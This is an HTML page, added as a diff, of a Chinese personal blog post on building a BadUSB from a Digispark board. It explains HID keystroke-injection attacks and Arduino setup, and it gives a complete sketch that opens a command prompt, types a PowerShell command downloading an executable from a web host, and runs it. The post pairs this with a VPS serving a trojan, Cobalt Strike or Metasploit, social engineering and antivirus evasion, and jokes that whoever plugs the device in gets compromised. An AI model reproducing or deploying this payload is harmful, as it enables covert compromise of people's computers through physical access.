@@ -1,0 +1,471 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Moindyの博客">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="Badusb制作 实验室摸鱼的时候没来由又想玩玩近源渗透所以就有了这篇文章，没什么技术含量单纯是好玩整活用的大佬勿喷。 HID攻击原理HID是Human Interface Device的缩写，是直接与人交互的设备，比如键盘、鼠标等等。攻击者可以将usb模拟成键盘，让电脑识别成为键盘，然后进行脚本模拟按键攻击。这种常用于近源渗透，可以配合社工一起使用。 HID攻击可以分为很多种，比如Teensy和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Badusb">
+<meta property="og:url" content="http://example.com/2021/12/08/Badusb/index.html">
+<meta property="og:site_name" content="Moindy&#39;Blog">
+<meta property="og:description" content="Badusb制作 实验室摸鱼的时候没来由又想玩玩近源渗透所以就有了这篇文章，没什么技术含量单纯是好玩整活用的大佬勿喷。 HID攻击原理HID是Human Interface Device的缩写，是直接与人交互的设备，比如键盘、鼠标等等。攻击者可以将usb模拟成键盘，让电脑识别成为键盘，然后进行脚本模拟按键攻击。这种常用于近源渗透，可以配合社工一起使用。 HID攻击可以分为很多种，比如Teensy和">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/12/08/Badusb/image-20211024200506100.png">
+<meta property="og:image" content="http://example.com/2021/12/08/Badusb/image-20211024200745515.png">
+<meta property="og:image" content="http://example.com/2021/12/08/Badusb/image-20211024201742845.png">
+<meta property="og:image" content="http://example.com/2021/12/08/Badusb/image-20211024201939631.png">
+<meta property="article:published_time" content="2021-12-08T02:51:45.000Z">
+<meta property="article:modified_time" content="2021-12-08T05:32:00.058Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2021/12/08/Badusb/image-20211024200506100.png">
+  
+  <title>Badusb - Moindy&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Moindy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Badusb">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-12-08 10:51" pubdate>
+        2021年12月8日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      7 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Badusb</h1>
+            
+            <div class="markdown-body">
+              <p>Badusb制作</p>
+<p>实验室摸鱼的时候没来由又想玩玩近源渗透所以就有了这篇文章，没什么技术含量单纯是好玩整活用的大佬勿喷。</p>
+<h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，是直接与人交互的设备，比如键盘、鼠标等等。攻击者可以将usb模拟成键盘，让电脑识别成为键盘，然后进行脚本模拟按键攻击。这种常用于近源渗透，可以配合社工一起使用。</p>
+<p>HID攻击可以分为很多种，比如Teensy和USB Rubber ducky等等，这里使用的digispark。</p>
+<h5 id="两种不同攻击的优势与劣势"><a href="#两种不同攻击的优势与劣势" class="headerlink" title="两种不同攻击的优势与劣势"></a>两种不同攻击的优势与劣势</h5><ul>
+<li>橡皮鸭它最初作为一个IT自动化的POC，通过嵌入式开发板实现的。橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装能力，成功的成为了极客们必不可少的工具，十分的方便，但是价格不太便宜。HAK5网站上的大黄鸭更是动不动就几十美刀，不过其实有很多HACK5的工具完全可以自制。</li>
+<li>Teensy是一套完整的基于USB微控制器的开发系统，在占用极少资源的情况下可以实现多种多样的项目。所有的编程可以通过USB端口进行或者使用ISP接口进行编程的。多方便，而且它的体积就两个角硬币那么大，同时可以模拟多种硬件，还有多余的I/O口可以供极客们随意改装.它的价格也是十分的便宜.就20RMB就可以入手啦。</li>
+</ul>
+<p>使用不同的开发板，所写的代码和驱动都是不一样的，所以使用的时候需要看准自己购买的型号。</p>
+<h5 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h5><p>1.直接淘宝购买一块digispark的开发板就可以直接使用了，如果想要美观欺骗性更强可以选择购买带usb壳的开发板。</p>
+<p>2.(可有可无)公网vps可以用来挂http服务用来下载马子执行。</p>
+<p>3.cs或者msf</p>
+<p>4.Arduino用来烧录开发板</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Arduino下载地址（国内论坛）https:<span class="hljs-regexp">//</span>www.arduino.cn/thread-<span class="hljs-number">5838</span>-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>.html<br>Arduino官方下载地址https:<span class="hljs-regexp">//</span>www.arduino.cc<span class="hljs-regexp">/en/</span>Main/Software<br>下载的时候需要看清,digispark好像没有版本要求，但是Teensy的安装包是有对应的Arduino版本要求的<br></code></pre></td></tr></table></figure>
+
+<p>下载完之后直接安装就可以，安装好之后在Arduino中加入对应的digispark开发板的支持(配置文件的下载需要翻墙,需要提前准备好梯子。)</p>
+<h5 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h5><p>在文件–&gt;首选项中加入附加开发版管理</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>digistump.com/package_digistump_index.json<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/12/08/Badusb/image-20211024200506100.png" srcset="/img/loading.gif" lazyload alt="image-20211024200506100"></p>
+<p>在工具–&gt;开发板中打开开发板管理器，找到Digistump AVR Boards安装就可以(安装过程需要挂代理).</p>
+<p><img src="/2021/12/08/Badusb/image-20211024200745515.png" srcset="/img/loading.gif" lazyload alt="image-20211024200745515"></p>
+<p>安装好之后就可以开始对digispark进行烧录程序了，可以直接在Arduino中编程了，开始默认有两个函数，一个setup()一个loop()，在插入开发板之后会执行一次setup()函数，然后循环loop()函数。其中代码是用的C语言</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">github一些开源的代码，只需要拿来稍微修改一下就可以用了<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hak5darren/</span>USB-Rubber-Ducky<span class="hljs-regexp">/wiki/</span>Payloads<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CedArctic/</span>DigiSpark-Scripts<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/digistump/</span>DigisparkArduinoIntegration<br></code></pre></td></tr></table></figure>
+
+<p>example:</p>
+<p><img src="/2021/12/08/Badusb/image-20211024201742845.png" srcset="/img/loading.gif" lazyload alt="image-20211024201742845"></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span><br><br>void setup<span class="hljs-literal">()</span> &#123;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(0)</span>;<br><br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">3000</span>);<span class="hljs-comment">//延迟</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_R, MOD_GUI_LEFT)</span>;<span class="hljs-comment">//win+R键</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;cmd&quot;</span>);<span class="hljs-comment">//输入cmd</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<span class="hljs-comment">//回车</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>print(<span class="hljs-string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://localhost/bypass.exe&#x27;,&#x27;D:\\bypass.exe&#x27;);\&quot;&quot;</span>);<span class="hljs-comment">//执行的命令</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">500</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>println(<span class="hljs-string">&quot;D:\\Pictures.exe&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>send<span class="hljs-constructor">KeyStroke(KEY_ENTER)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DigiKeyboard</span>.</span></span>delay(<span class="hljs-number">200</span>);<br><br>&#125;<br><br>void loop<span class="hljs-literal">()</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>点了上传键之后在60s之内插入你的u盘可以直接烧录成功了。</p>
+<p><img src="/2021/12/08/Badusb/image-20211024201939631.png" srcset="/img/loading.gif" lazyload alt="image-20211024201939631"></p>
+<p><del>谁插谁上线，用了都说好</del></p>
+<p>除了powershell下载的思路其他思路就不用我多说了(可以结合前一篇文章的免杀一同食用效果更佳)，大师傅们肯定还有很多其他的骚操作dddd</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/12/08/go-bypass/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">go_bypass</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/24/bilibili-1024/">
+                        <span class="hidden-mobile">bilibili_1024</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
